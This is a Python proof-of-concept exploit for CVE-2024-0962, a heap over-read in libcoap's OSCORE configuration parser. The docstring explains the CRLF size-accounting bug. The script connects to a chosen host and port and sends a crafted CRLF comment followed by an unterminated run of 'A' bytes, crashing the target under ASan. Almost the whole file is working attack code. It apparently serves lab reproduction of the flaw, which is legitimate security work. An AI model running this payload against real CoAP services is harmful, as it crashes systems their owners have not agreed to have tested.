#!/usr/bin/env python3
"""
PoC for CVE-2024-0962 - libcoap OSCORE config get_split_entry() over-read.

get_split_entry() mishandles the size accounting for a comment/blank line that
ends in CRLF: it subtracts using the '\\r'-decremented `end`, under-counting the
consumed bytes by 1. The next memchr(begin, '\\n', size) therefore scans one byte
past the end of the configuration buffer.

We send:
    "#\\r\\n"          (a comment line ending in CRLF -> triggers the bad subtract)
    + "A"*N            (a final line with NO trailing newline and no '\\n' at all)

so the retry memchr runs off the end of the heap-tight buffer into the ASan
right-redzone -> heap-buffer-overflow abort.

Usage: poc_cve_2024_0962.py [host] [port]
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5683

# Comment line ending in CRLF, then an unterminated tail with no newline.
blob = b"#\r\n" + b"A" * 64

print(f"[*] Connecting to {host}:{port}")
s = socket.create_connection((host, port), timeout=5)
print(f"[*] Sending {len(blob)}-byte OSCORE config (CRLF comment + unterminated tail)")
s.sendall(blob)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
try:
    data = s.recv(256)
    print(f"[*] Server response: {data!r}")
except OSError as e:
    print(f"[*] Connection closed/reset (expected on crash): {e}")
s.close()
print("[*] Done. Check `docker logs` for the ASan heap-buffer-overflow trace.")
